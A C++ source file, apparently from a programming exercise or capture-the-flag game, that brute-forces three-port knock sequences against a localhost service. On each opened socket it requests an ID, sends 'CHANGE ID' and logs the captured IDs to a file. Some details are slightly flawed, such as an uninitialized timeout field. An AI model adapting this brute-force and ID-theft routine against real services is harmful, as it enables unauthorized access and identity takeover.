#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/socket.h>
#include <unistd.h>
#include <csignal>
#include <vector>

#include "knocker.h"
#include "file_io.h"

// Request an ID and return the following response
std::string get_id(int sock) {
    char buffer[1000];
    memset(buffer, 0, sizeof(buffer));

    // Discard any queued welcome messages
    // Return if the socket has been closed
    if(!read(sock, buffer, 255)) {
        return "";
    }

    std::string command = "ID";
    send(sock, command.c_str(), command.length(), MSG_NOSIGNAL);

    struct timeval t;
    t.tv_sec = 3;

    fd_set socks;
    FD_ZERO(&socks);
    FD_SET(sock, &socks);
    select(sock+1, &socks, NULL, NULL, &t);

    if(FD_ISSET(sock, &socks)) {
        memset(buffer, 0, sizeof(buffer));
        read(sock, buffer, 255);

        command = "CHANGE ID";
        send(sock, command.c_str(), command.length(), MSG_NOSIGNAL);
        return buffer;
    }

    return "";
}

// Brute force given port numbers and log any response from get_id() that looks like a message
void steal() {

    // Ignore broken pipes
    signal (SIGPIPE, SIG_IGN);

    File_io io;
    Knocker k;

    // Ports are added to the file manually
    std::vector<int> ports = settings::get_io().get_lines<int>("ports.txt");
    std::string host = "localhost";

    std::cout << "Stealing IDs" << std::endl;
    for(int port1 : ports) {
        for(int port2 : ports) {
            for(int port3: ports) {

                // Wait for 50ms to avoid stack smashing
                usleep(50000);
                
                // A port is repeated
                if(port1 == port2 || port2 == port3 || port1 == port3) {
                    continue;
                }

                int ports[3] = {port1, port2, port3};
                Knocker k;
                int sock = k.knock(host.c_str(), ports);

                // Knock returned a seemingly valid socket
                if(sock < 1) { continue; }

                // Attempt to get an ID from the socket
                std::string result = get_id(sock);

                // We actually received something
                if(result.compare("") != 0) {

                    // Log it
                    io.log(result, "taken_ids.txt");
                }
            }
        }
    }

    std::cout << "Finished taking IDs" << std::endl;
}
